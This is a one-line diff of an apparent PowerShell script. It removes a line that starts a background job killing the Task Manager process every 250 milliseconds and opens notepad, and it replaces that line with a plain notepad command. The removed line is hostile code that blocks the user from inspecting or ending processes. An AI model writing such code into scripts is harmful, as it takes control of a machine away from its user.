@@ -1,1 +1,1 @@
-Start-Job { while ($true) { Get-Process | Where-Object { $_.ProcessName -eq "Taskmgr" } | ForEach-Object { $_.Kill() }; Start-Sleep -Milliseconds 250 } }; notepad.exe .txt
+notepad.exe 123.txt
